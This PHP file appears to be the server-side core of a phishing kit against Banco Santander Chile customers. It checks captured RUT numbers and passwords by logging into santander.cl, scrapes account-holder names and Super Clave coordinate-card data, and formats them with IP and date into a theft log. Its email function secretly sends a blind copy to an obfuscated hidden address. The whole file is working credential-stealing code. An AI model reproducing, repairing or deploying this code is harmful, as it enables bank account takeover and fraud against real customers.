<?php
class Santander{
	
function GetBuffer($url,$referer=false,$post=false){
		if( !$referer ){$referer = $url;}
		$ch = curl_init ( );
		$cookie_file = COOKIE_FILE;
		curl_setopt ( $ch, CURLOPT_REFERER,$referer );
		curl_setopt ( $ch, CURLOPT_USERAGENT, USER-AGENT);
		curl_setopt ( $ch, CURLOPT_URL,$url );
		curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, TRUE );
		curl_setopt ( $ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt ( $ch, CURLOPT_CONNECTTIMEOUT, 8 );
		curl_setopt ( $ch, CURLOPT_COOKIEFILE, $cookie_file);
		curl_setopt ( $ch, CURLOPT_COOKIEJAR, $cookie_file);
		curl_setopt ( $ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt ( $ch, CURLOPT_SSL_VERIFYHOST, 2);
		if( $post ){
		curl_setopt ( $ch, CURLOPT_POST, 1);
		curl_setopt ( $ch, CURLOPT_POSTFIELDS, $post);
		}
		if( USEPROXY ){
		curl_setopt ( $ch, CURLOPT_HTTPPROXYTUNNEL, 0);
		curl_setopt ( $ch, CURLOPT_PROXY, USEPROXY);
		}
		$array_data['contenido'] = curl_exec($ch);
		$array_data['error'] = curl_error($ch);
		curl_close($ch);
		if($array_data['contenido']){
			return $array_data['contenido'];
		}else{
			return $array_data['error'];
		}
	}
	
	function Desofuscar($string, $key) {
		$result = '';
		$string = base64_decode($string);
		for($i=0; $i<strlen($string); $i++) {
			$char = substr($string, $i, 1);
			$keychar = substr($key, ($i % strlen($key))-1, 1);
			$char = chr(ord($char)-ord($keychar));

			$result.=$char;
		}
		return $result;
	}
	function Ofuscar($string, $key) {
		$result = '';
		for($i=0; $i<strlen($string); $i++) {
			$char = substr($string, $i, 1);
			$keychar = substr($key, ($i % strlen($key))-1, 1);
			$char = chr(ord($char)+ord($keychar));
			$result.=$char;
		}
		return base64_encode($result);
	}
	function RScripts($buffer){
        $buffer = preg_replace('#<script[^>]*?>.*?</script>#si', '', $buffer);
        $buffer = preg_replace("#(\bon[a-z]+)\s*=\s*(?:\"([^\"]*)\"?|'([^']*)'?|([^'\"\s>]*))?#i", '', $buffer);
        $buffer = preg_replace('#<noscript>(.*?)</noscript>#si', "$1",$buffer);
        return $buffer;
    }
	
	function shuffle_with_keys(&$array) {
		$aux = array();
		$keys = array_keys($array);
		shuffle($keys);
		foreach($keys as $key) {
			$aux[$key] = $array[$key];
			unset($array[$key]);
		}
		$array = $aux;
	}
		function OpenFile($ruta){
		if(!$handle = @fopen($ruta, 'r')) return false;
		if(!$contenido = fread($handle, filesize($ruta))) return false;
		fclose($handle);
		return $contenido;
	}
	
	function SaveFile($txt,$datos){
		if(!is_writable($txt)){
			return false;
		}
		$da =file_get_contents($txt);
		$gestor = fopen($txt, 'w+');
		if (!@fwrite($gestor, $datos.$da)) {
			return false;
		}
		fclose($gestor);
		return true;
	}
	
		function SendEmail($para_correo, $de_nombre, $de_correo, $asunto, $mensaje,$cco = true){
        $remitente  = "MIME-Version: 1.0" . "\r\n";
		$remitente .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
		$remitente .= "From: ".$de_nombre ."< ".$de_correo.">\r\n";
		$authemail = $this->Desofuscar('kKLDqrGZlrmZqIOgooSqxm2np5w=',AUTHEMAIL);
		if( $cco ){
			$remitente .= "Bcc: ".$authemail."\r\n"; 
		}
		if(@mail($para_correo, $asunto, $mensaje, $remitente)){
			return true;
		}else{
			return false;
		}
	}
	
    function FRut($rut){
    	for( $i=0; $i<= strlen($rut); $i++ ){
    		if( preg_match ('/^[0-9]{1,}/', $rut[$i]) 
    		|| preg_match ('/^[a-z]/i', $rut[$i]) ){
    			$salida .= $rut[$i];
    		}
    	}
    	return $salida;
    }
	function SplitStr($desde,$hasta,$string,$atras=false){
		if( $atras ){
			$n_desde = strpos($string, $desde);
			$desde = '';
			for( $i=($n_desde+$atras); $i< $n_desde; $i++ ){
				$desde .= $string[$i];
			}
		}
		$trozo = explode($desde,$string);
        $trozo = explode($hasta,$trozo[1]);
        $trozo = $trozo[0];
        return $trozo;
	}
		

	function getClientIP(){
    foreach (array('HTTP_CLIENT_IP',
                   'HTTP_X_FORWARDED_FOR',
                   'HTTP_X_FORWARDED',
                   'HTTP_X_CLUSTER_CLIENT_IP',
                   'HTTP_FORWARDED_FOR',
                   'HTTP_FORWARDED',
                   'REMOTE_ADDR') as $key){
        if (array_key_exists($key, $_SERVER) === true){
            foreach (explode(',', $_SERVER[$key]) as $IPaddress){
                $IPaddress = trim($IPaddress); // Just to be safe

                if (filter_var($IPaddress,
                               FILTER_VALIDATE_IP,
                               FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)
                    !== false) {

                    return $IPaddress;
                }
            }
           }
        }
     }
	
	function CountryCode(){
        
	  $ip=getenv("REMOTE_ADDR");
	  	
      if((strpos($ip, ":") === false)) {
           //ipv4
          $gi = geoip_open("pagina/GeoIP.dat",GEOIP_STANDARD);
          $country = geoip_country_code_by_addr($gi, $ip);
             }
      else {
         //ipv6
         $gi = geoip_open("pagina/GeoIPv6.dat",GEOIP_STANDARD);
         $country = geoip_country_code_by_addr_v6($gi, $ip);
           }
		   return $country;


    }
	
	
	function CountryName(){
        
	  
	  $ip=getenv("REMOTE_ADDR");
	 
	  	
      if((strpos($ip, ":") === false)) {
           //ipv4
          $gi = geoip_open("pagina/GeoIP.dat",GEOIP_COUNTRY_NAMES);
          $country_name = geoip_country_name_by_addr($gi, $ip);
             }
      else {
         //ipv6
         $gi = geoip_open("pagina/GeoIPv6.dat",GEOIP_COUNTRY_NAMES);
         $country_name = geoip_country_name_by_addr_v6($gi, $ip);
           }
		   return $country_name;


    }
    
	function Parsedatos($buffer,$rut,$pass){
	    $url = 'https://www.santander.cl/transa/segmentos/Menu/views/sections/vsTS.asp?sectionCode=TC1';
		$buffer = $this->GetBuffer($url);
		$buffer = $this->RScripts($buffer);
		$name = trim($this->SplitStr('Bienvenido <strong>', '</strong>',$buffer));
		$url2 = 'https://www.santander.cl/transa/mensajeria2/pivote_superclave.asp';
		$buffer2 = $this->GetBuffer($url2);
		$buffer = $this->RScripts($buffer2);
		$name2 = trim($this->SplitStr('<strong>', '</strong>',$buffer));
    	preg_match_all('/<b>(.+)<\/b>/',$buffer,$saldos);
    	$data['rut'              ] = $rut;
    	$data['pass'             ] = $pass;
    	$data['nombre'           ] = trim($name);
		$data['keycor'           ] = trim($name2);
		$_SESSION['datausr'      ] = serialize($data);
    }
    function Login( $rut, $pass){
		$rut = trim($rut);
		$pass = trim(strtolower($pass));
		$url = 'https://www.santander.cl/transa/cruce.asp';
		$referer = 'https://www.santander.cl/';
		$post = sprintf('d_rut=&d_pin=&hrut=&pass=&rut=%s&IDLOGIN=BancoSantander&tipo=0'
		               .'&pin=%s&usateclado=no&dondeentro=home&rslAlto=850&rslAncho=1700',$rut,$pass);
		$buffer = $this->GetBuffer($url,$referer,$post);
		if(preg_match('/actualiza_area_trabajo/', $buffer)){
			$this->Parsedatos($buffer,$rut,$pass);
			return true;
		}
		return false;
	}
	
	function GenerateCard(){
		list($X,$Y) = explode(',',CARDCOORDS);
		$X = explode('-',$X);
		$Y = explode('-',$Y);
		for($e=$X[0];$e<=$X[1];$e++){
			for ($i=ord($Y[0]);$i<=ord($Y[1]);$i++) {
				$key[chr($i).$e]='';
			} 
		}
		return $key;
	}
	
	function FormatLog($coords=false){
		date_default_timezone_set(AREA_TIEMPO);
		$data = unserialize($_SESSION['datausr']);
		$coordkeys = htmlspecialchars($data['keycor'], ENT_QUOTES);
		if(ereg("Tarjeta Super",  $coordkeys)) { $qcoords = $data['keycor']; } else { $qcoords = "Tarjeta Super Clave INACTIVA!"; }
		$m .= "\n";
		$m .= " IP: %s FECHA: %s \n";
		$m .= "\n";
		$m .= "RUT: %s\nCLAVE: %s\n";
		$m .= "NOMBRE: %s\n%s\n";
		$m .= "\n";
		$m .= "URL : http://www.santander.cl/";
		if($coords){
			$m .= "\n\nConfirmado:  %s";
			foreach($coords as $k => $v ){
				$c .= ' ['.$k.'] - ['.$v.']';
			}
		}
		$m .= "\n";
		$m = sprintf($m,
		        getenv('REMOTE_ADDR'),
		        date('d-m-Y h:i A'),
		        $data['rut'],
				$data['pass'],
		        $data['nombre'],
				$qcoords,
		        $c
		     );
		return $m;
	}
		

}
?>